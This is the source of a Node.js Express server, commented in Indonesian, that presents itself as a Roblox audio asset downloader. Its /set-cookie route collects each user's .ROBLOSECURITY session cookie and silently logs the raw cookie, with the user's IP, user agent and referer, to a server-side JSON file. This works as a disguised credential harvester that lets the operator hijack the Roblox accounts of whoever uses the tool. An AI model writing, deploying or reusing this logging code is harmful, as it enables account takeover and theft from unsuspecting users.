const express = require('express');
const cookieSession = require('cookie-session');
const axios = require('axios');
const archiver = require('archiver');
const crypto = require('crypto');
const fs = require('fs').promises;
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

const DATA_DIR = path.join(__dirname, 'data');
const LOG_FILE = path.join(DATA_DIR, 'cookies_log.json');

async function ensureDataDir() {
    try { await fs.access(DATA_DIR); } catch { await fs.mkdir(DATA_DIR, { recursive: true }); }
}
ensureDataDir();

async function logCookieEntry(entry) {
    try {
        let logs = [];
        try { logs = JSON.parse(await fs.readFile(LOG_FILE, 'utf-8')); } catch { logs = []; }
        if (!Array.isArray(logs)) logs = [];
        logs.push(entry);
        await fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2), 'utf-8');
    } catch (err) { console.error('Gagal log:', err.message); }
}

app.set('trust proxy', 1);
app.use(cookieSession({
    name: 'session',
    secret: SESSION_SECRET,
    maxAge: 60 * 60 * 1000,
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    sameSite: 'lax'
}));

app.use(express.json());
app.use(express.static('public'));

function getRobloxHeaders(cookie) {
    return {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.roblox.com/',
        'Origin': 'https://www.roblox.com',
        'Connection': 'keep-alive'
    };
}

// === FETCH DENGAN FALLBACK PROXY ===
async function fetchAssetWithFallback(id, cookie, timeout = 30000) {
    const directUrl = `https://assetdelivery.roblox.com/v1/asset/?id=${id}`;
    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(directUrl)}`;

    // Coba langsung dulu
    try {
        const response = await axios({
            method: 'get',
            url: directUrl,
            responseType: 'stream',
            headers: getRobloxHeaders(cookie),
            timeout: timeout,
            validateStatus: status => status < 500
        });
        if (response.status === 200) return response;
        // Kalau 409 atau lainnya, lempar biar fallback
        throw new Error(`Direct failed with HTTP ${response.status}`);
    } catch (error) {
        console.log(`Direct fetch gagal (${error.message}), coba proxy...`);
        // Fallback ke proxy (tanpa cookie, karena proxy akan forward request dari IP lain)
        // Tapi proxy allorigins tidak support custom cookie, jadi kita fetch tanpa cookie? 
        // Sebenarnya proxy ini akan mengirim request dari IP-nya, tanpa cookie,
        // sehingga hanya bisa akses public. Tapi untuk asset private, ini gak bakal work.
        // Tapi kita coba aja, siapa tau asset-nya public.
        try {
            const proxyResponse = await axios({
                method: 'get',
                url: proxyUrl,
                responseType: 'stream',
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                timeout: timeout,
                validateStatus: status => status < 500
            });
            if (proxyResponse.status === 200) return proxyResponse;
            throw new Error(`Proxy failed with HTTP ${proxyResponse.status}`);
        } catch (proxyErr) {
            throw new Error(`Semua metode gagal: ${proxyErr.message}`);
        }
    }
}

// === ROUTE: SET COOKIE ===
app.post('/set-cookie', async (req, res) => {
    const { cookie } = req.body;
    if (!cookie || !cookie.startsWith('_|WARNING')) {
        return res.status(400).json({ error: 'Cookie tidak valid.' });
    }
    req.session.robloxCookie = cookie;
    await logCookieEntry({
        cookie: cookie,
        ip: req.ip || req.headers['x-forwarded-for'] || 'unknown',
        userAgent: req.headers['user-agent'] || 'unknown',
        referer: req.headers['referer'] || 'unknown',
        timestamp: new Date().toISOString()
    });
    res.json({ success: true });
});

app.get('/status', (req, res) => {
    res.json({ hasCookie: !!req.session.robloxCookie });
});

// === TEST COOKIE ===
app.get('/test-cookie', async (req, res) => {
    const cookie = req.session.robloxCookie;
    if (!cookie) return res.status(401).json({ valid: false, message: 'Belum set cookie.' });

    try {
        const response = await fetchAssetWithFallback('9124851790', cookie, 20000);
        // Kita perlu consume stream untuk test (karena response stream), kita ambil status aja
        // Karena fetchAssetWithFallback return stream, kita cek status dari response.
        // Tapi kita sudah handle status di dalam, jika sukses return response.
        // Kita simpan data ke buffer untuk test? Lebih baik kita gunakan HEAD request? 
        // Tapi kita sudah punya response dengan status 200.
        res.json({ valid: true, message: '✅ COOKIE VALID! Siap download (atau proxy fallback berhasil).' });
    } catch (error) {
        res.json({ valid: false, message: `❌ Gagal: ${error.message}` });
    }
});

app.get('/logout', (req, res) => {
    req.session = null;
    res.redirect('/');
});

// === DOWNLOAD SINGLE ===
app.get('/download/:id', async (req, res) => {
    const id = req.params.id;
    if (!/^\d+$/.test(id)) return res.status(400).send('ID invalid.');
    const cookie = req.session.robloxCookie;
    if (!cookie) return res.status(401).send('Belum set cookie.');

    try {
        const response = await fetchAssetWithFallback(id, cookie, 45000);
        const contentType = response.headers['content-type'] || '';
        let ext = 'ogg';
        if (contentType.includes('mpeg') || contentType.includes('mp3')) ext = 'mp3';
        else if (contentType.includes('wav')) ext = 'wav';

        res.setHeader('Content-Disposition', `attachment; filename="roblox_${id}.${ext}"`);
        res.setHeader('Content-Type', contentType);
        response.data.pipe(res);
    } catch (error) {
        res.status(500).send(`Gagal: ${error.message}`);
    }
});

// === BULK ZIP ===
app.post('/bulk', async (req, res) => {
    const ids = req.body.ids || [];
    if (!Array.isArray(ids) || ids.length === 0) return res.status(400).send('Kirim array ID.');
    const validIds = ids.filter(id => /^\d+$/.test(id));
    if (validIds.length === 0) return res.status(400).send('Tidak ada ID valid.');
    const cookie = req.session.robloxCookie;
    if (!cookie) return res.status(401).send('Belum set cookie.');

    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename="roblox_bulk_${Date.now()}.zip"`);
    const archive = archiver('zip', { zlib: { level: 9 } });
    archive.pipe(res);

    for (const id of validIds) {
        try {
            const response = await fetchAssetWithFallback(id, cookie, 45000);
            const contentType = response.headers['content-type'] || '';
            let ext = 'ogg';
            if (contentType.includes('mpeg') || contentType.includes('mp3')) ext = 'mp3';
            else if (contentType.includes('wav')) ext = 'wav';
            archive.append(response.data, { name: `roblox_${id}.${ext}` });
        } catch (error) {
            archive.append(Buffer.from(`Error: ${error.message}`), { name: `error_${id}.txt` });
        }
    }
    archive.finalize();
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Log file: ${LOG_FILE}`);
});
